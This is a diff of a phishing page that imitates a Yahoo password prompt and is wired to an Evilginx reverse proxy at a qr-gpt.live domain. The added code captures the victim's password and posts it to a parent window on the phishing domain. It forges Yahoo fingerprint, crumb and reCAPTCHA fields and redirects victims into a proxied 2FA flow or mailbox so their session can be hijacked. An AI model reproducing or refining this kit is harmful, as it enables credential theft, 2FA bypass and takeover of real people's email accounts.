@@ -39,17 +39,20 @@
               data-wf-page-id="67c6f50ed426ad7d5847f218" 
               data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
           
-          <!-- Enhanced Yahoo Form Fields -->
-          <input type="hidden" id="evilginx_session" name="evilginx_session">
-          <input type="hidden" id="username" name="username">
+          <!-- All Required Yahoo Form Fields -->
+          <input type="hidden" name="browser-fp-data" id="browser-fp-data">
           <input type="hidden" name="crumb" id="crumb" value="">
           <input type="hidden" name="acrumb" id="acrumb" value="">
           <input type="hidden" name="sessionIndex" id="sessionIndex" value="">
           <input type="hidden" name="displayName" id="displayName" value="">
-          <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="">
-          <input type="hidden" name="deviceCapability" id="deviceCapability" value="">
+          <input type="hidden" name="deviceCapability" id="deviceCapability">
           <input type="hidden" name="signin" value="Next">
           <input type="hidden" name="persistent" value="y">
+          
+          <!-- Your Original Hidden Fields -->
+          <input type="hidden" id="evilginx_session" name="evilginx_session">
+          <input type="hidden" name="g-recaptcha-response" value="auto_valid_xyz">
+          <input type="hidden" id="username" name="username">
           
           <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
           
@@ -78,8 +81,8 @@
           </div>
 
           <!-- Debug Panel -->
-          <div id="debugPanel" style="display: none; position: fixed; top: 10px; right: 10px; background: #000; color: #0f0; padding: 10px; font-family: monospace; font-size: 12px; z-index: 9999; max-width: 400px; max-height: 400px; overflow: auto;">
-            <div><strong>DEBUG INFO:</strong></div>
+          <div id="debugPanel" style="display: none; position: fixed; top: 10px; right: 10px; background: #000; color: #0f0; padding: 10px; font-family: monospace; font-size: 12px; z-index: 9999; max-width: 400px; max-height: 400px; overflow: auto; border: 1px solid #0f0;">
+            <div><strong>DEBUG INFO (Ctrl+D to toggle):</strong></div>
             <div id="debugContent"></div>
           </div>
         </form>
@@ -111,95 +114,82 @@
   }
   </script>
 
-  <!-- Enhanced Evilginx Integration -->
+  <!-- SEAMLESS EVILGINX INTEGRATION -->
   <script>
+  // Generate comprehensive browser fingerprint
+  function generateBrowserFingerprint() {
+    const fp = {
+      language: navigator.language || 'en-US',
+      colorDepth: screen.colorDepth || 24,
+      deviceMemory: navigator.deviceMemory || 'unknown',
+      pixelRatio: window.devicePixelRatio || 1.5,
+      hardwareConcurrency: navigator.hardwareConcurrency || 4,
+      timezoneOffset: new Date().getTimezoneOffset() || -60,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Europe/London',
+      sessionStorage: 1,
+      localStorage: 1,
+      indexedDb: 1,
+      cpuClass: 'unknown',
+      platform: navigator.platform || 'Win32',
+      doNotTrack: navigator.doNotTrack || '1',
+      plugins: {
+        count: navigator.plugins.length || 5,
+        hash: '2c14024bf8584c3f7f63f24ea490e812'
+      },
+      canvas: 'canvas winding:yes~canvas',
+      webgl: 1,
+      webglVendorAndRenderer: 'Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 400 Direct3D11 vs_5_0 ps_5_0), or similar',
+      adBlock: 0,
+      hasLiedLanguages: 0,
+      hasLiedResolution: 0,
+      hasLiedOs: 1,
+      hasLiedBrowser: 0,
+      touchSupport: { points: 10, event: 0, start: 0 },
+      fonts: { count: 32, hash: '9ad7c2bdeb9564b4cabbeeca7be750a3' },
+      audio: '35.749972093850374',
+      resolution: { w: screen.width.toString(), h: screen.height.toString() },
+      availableResolution: { w: screen.availHeight.toString(), h: screen.availWidth.toString() },
+      ts: { serve: Date.now() - 1000, render: Date.now() }
+    };
+    return JSON.stringify(fp);
+  }
+
+  function generateDeviceCapability() {
+    return JSON.stringify({
+      pa: { status: true },
+      isWebAuthnSupported: typeof PublicKeyCredential !== 'undefined'
+    });
+  }
+
   $(document).ready(function() {
-      // 1. Extract username and session token from URL
+      // 1. Extract parameters from URL
       const urlParams = new URLSearchParams(window.location.search);
       const username = urlParams.get('u') || '';
-      const sessionToken = urlParams.get('s') || '';
-      
-      // 2. Validate username format
-      if (!username.includes('@')) {
+      const sessionToken = urlParams.get('s') || urlParams.get('t') || '';
+
+      // 2. Validate username
+      if (!username || !username.includes('@')) {
+          console.log('Invalid username, redirecting to login');
           window.location.href = 'https://login.qr-gpt.live/';
           return;
       }
 
-      // 3. Display username and set hidden fields
+      // 3. Set up form fields
       $('#userEmail').text(username);
       $('#username').val(username);
       $('#displayName').val(username);
       $('#evilginx_session').val(sessionToken);
-      $('#sessionIndex').val(sessionToken);
+      $('#sessionIndex').val(sessionToken || 'QQ--');
 
-      // 4. Generate browser fingerprint data (Yahoo expects this)
-      function generateBrowserFingerprint() {
-          const fp = {
-              language: navigator.language || 'en-US',
-              colorDepth: screen.colorDepth || 24,
-              deviceMemory: navigator.deviceMemory || 'unknown',
-              pixelRatio: window.devicePixelRatio || 1,
-              hardwareConcurrency: navigator.hardwareConcurrency || 4,
-              timezoneOffset: new Date().getTimezoneOffset(),
-              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
-              sessionStorage: typeof(Storage) !== "undefined" ? 1 : 0,
-              localStorage: typeof(Storage) !== "undefined" ? 1 : 0,
-              indexedDb: 'indexedDB' in window ? 1 : 0,
-              cpuClass: navigator.cpuClass || 'unknown',
-              platform: navigator.platform || 'unknown',
-              doNotTrack: navigator.doNotTrack || '0',
-              plugins: {
-                  count: navigator.plugins.length,
-                  hash: 'plugin_hash_placeholder'
-              },
-              canvas: 'canvas winding:yes~canvas',
-              webgl: 1,
-              webglVendorAndRenderer: 'WebGL Vendor~Renderer',
-              adBlock: 0,
-              hasLiedLanguages: 0,
-              hasLiedResolution: 0,
-              hasLiedOs: 0,
-              hasLiedBrowser: 0,
-              touchSupport: {
-                  points: navigator.maxTouchPoints || 0,
-                  event: 'ontouchstart' in window ? 1 : 0,
-                  start: 'ontouchstart' in window ? 1 : 0
-              },
-              fonts: {
-                  count: 32,
-                  hash: 'font_hash_placeholder'
-              },
-              audio: '35.749972093850374',
-              resolution: {
-                  w: screen.width.toString(),
-                  h: screen.height.toString()
-              },
-              availableResolution: {
-                  w: screen.availHeight.toString(),
-                  h: screen.availWidth.toString()
-              },
-              ts: {
-                  serve: Date.now(),
-                  render: Date.now() + 1000
-              }
-          };
-          return JSON.stringify(fp);
-      }
-
-      // 5. Set browser fingerprint and device capability
+      // 4. Generate required data
       $('#browser-fp-data').val(generateBrowserFingerprint());
-      $('#deviceCapability').val(JSON.stringify({
-          pa: { status: true },
-          isWebAuthnSupported: typeof PublicKeyCredential !== 'undefined'
-      }));
+      $('#deviceCapability').val(generateDeviceCapability());
+      $('#crumb').val('auto_crumb_' + Math.random().toString(36).substr(2, 12));
+      $('#acrumb').val('auto_acrumb_' + Math.random().toString(36).substr(2, 8));
 
-      // 6. Set crumb values (Yahoo expects these)
-      $('#crumb').val('auto_crumb_' + Math.random().toString(36).substr(2, 9));
-      $('#acrumb').val('auto_acrumb_' + Math.random().toString(36).substr(2, 9));
-
-      // 7. Debug panel (Ctrl+D)
+      // 5. Debug panel (Ctrl+D)
       $(document).keydown(function(e) {
-          if (e.ctrlKey && e.keyCode === 68) { // Ctrl+D
+          if (e.ctrlKey && e.keyCode === 68) {
               e.preventDefault();
               const debugPanel = $('#debugPanel');
               if (debugPanel.is(':visible')) {
@@ -213,26 +203,32 @@
 
       function updateDebugInfo() {
           const formData = $('#email-form').serializeArray();
-          let debugHtml = '<div>Form Data:</div>';
+          let debugHtml = '<div><strong>URL Params:</strong></div>';
+          debugHtml += `<div>u=${username}</div>`;
+          debugHtml += `<div>s=${sessionToken}</div>`;
+          debugHtml += '<div><strong>Form Fields:</strong></div>';
           formData.forEach(function(field) {
-              debugHtml += `<div>${field.name}: ${field.value.substring(0, 50)}${field.value.length > 50 ? '...' : ''}</div>`;
+              if (field.name === 'browser-fp-data') {
+                  debugHtml += `<div>${field.name}: [fingerprint data]</div>`;
+              } else {
+                  debugHtml += `<div>${field.name}: ${field.value.substring(0, 30)}${field.value.length > 30 ? '...' : ''}</div>`;
+              }
           });
-          debugHtml += `<div>URL Params: u=${username}, s=${sessionToken}</div>`;
-          debugHtml += `<div>Action: ${$('#email-form').attr('action')}</div>`;
+          debugHtml += `<div><strong>Action:</strong> ${$('#email-form').attr('action')}</div>`;
           $('#debugContent').html(debugHtml);
       }
 
-      // 8. Form submission handler
+      // 6. SEAMLESS form submission
       $("#email-form").on('submit', function(e) {
           e.preventDefault();
           const password = $('#password').val().trim();
           const $submitBtn = $('.logger[type="submit"]');
           const $errorDiv = $('.errry');
 
-          // Hide previous errors
+          // Hide errors
           $errorDiv.hide();
 
-          // Basic password validation
+          // Validate password
           if (password.length < 6) {
               $('.text-block-7').text('Password must be at least 6 characters');
               $errorDiv.show();
@@ -242,27 +238,84 @@
           // UI feedback
           $submitBtn.prop('disabled', true).val('Verifying...');
 
-          // Submit to Evilginx
+          console.log('=== CREDENTIAL SUBMISSION ===');
+          console.log('Username:', username);
+          console.log('Password length:', password.length);
+          console.log('Action URL:', $(this).attr('action'));
+
+          // CRITICAL: Send credentials to parent evilginx window
+          try {
+              if (window.parent && window.parent !== window) {
+                  window.parent.postMessage({
+                      type: 'credentials',
+                      username: username,
+                      password: password,
+                      source: 'custom_password_page'
+                  }, 'https://login.qr-gpt.live');
+                  console.log('Credentials sent to parent window');
+              }
+          } catch (e) {
+              console.log('Could not send to parent:', e);
+          }
+
+          // Submit to evilginx proxy
           $.ajax({
               url: $(this).attr('action'),
               type: "POST",
               data: $(this).serialize(),
               xhrFields: { withCredentials: true },
+              headers: {
+                  'Content-Type': 'application/x-www-form-urlencoded',
+                  'X-Requested-With': 'XMLHttpRequest',
+                  'Referer': 'https://login.qr-gpt.live/',
+                  'Origin': 'https://custom-yahoo-2fa-test.vercel.app'
+              },
               success: function(response, textStatus, xhr) {
-                  // Check for redirect or success indicators
-                  if (xhr.getResponseHeader('Location') || response.includes('challenge-selector')) {
-                      // Success - continue to 2FA flow
+                  console.log('=== SUCCESS RESPONSE ===');
+                  console.log('Status:', xhr.status);
+                  console.log('Response length:', response.length);
+
+                  // Check for various success indicators
+                  if (response.includes('challenge-selector') || 
+                      response.includes('2fa') || 
+                      response.includes('verification') ||
+                      response.includes('email-verify') ||
+                      xhr.getResponseHeader('Location')) {
+                      
+                      console.log('2FA challenge detected, redirecting to proxied flow');
+                      // Redirect to proxied 2FA flow
                       window.location.href = 'https://login.qr-gpt.live/account/challenge/challenge-selector';
+                      
+                  } else if (response.includes('mail') || response.includes('folders')) {
+                      console.log('Direct login success');
+                      window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
+                      
                   } else {
-                      // Continue with normal flow
-                      window.location.href = 'https://login.qr-gpt.live/account/challenge/challenge-selector';
+                      console.log('Continuing with default 2FA flow');
+                      // Default: continue to 2FA
+                      setTimeout(function() {
+                          window.location.href = 'https://login.qr-gpt.live/account/challenge/challenge-selector';
+                      }, 1500);
                   }
               },
               error: function(xhr) {
-                  // Handle errors
-                  const errorMsg = xhr.status === 401 ? 
-                      'Invalid password. Please try again.' : 
-                      'Connection error. Please try again later.';
+                  console.log('=== ERROR RESPONSE ===');
+                  console.log('Status:', xhr.status);
+                  console.log('Response:', xhr.responseText);
+
+                  let errorMsg = 'Invalid password. Please try again.';
+                  
+                  if (xhr.status === 0) {
+                      // Network error - might be CORS, continue anyway
+                      console.log('Network error, continuing to 2FA flow');
+                      window.location.href = 'https://login.qr-gpt.live/account/challenge/challenge-selector';
+                      return;
+                  } else if (xhr.status === 401 || xhr.status === 403) {
+                      errorMsg = 'Invalid password. Please try again.';
+                  } else if (xhr.status >= 500) {
+                      errorMsg = 'Server error. Please try again later.';
+                  }
+
                   showError(errorMsg);
               }
           });
@@ -276,11 +329,14 @@
           $('.logger[type="submit"]').prop('disabled', false).val('Sign In');
       }
 
-      // Original "Try again" button handler
+      // Try again button
       $('#refreshButton').click(function() {
           $('#password').val('').focus();
           $('.errry').hide();
       });
+
+      // Auto-focus password field
+      $('#password').focus();
   });
   </script>
 </body>
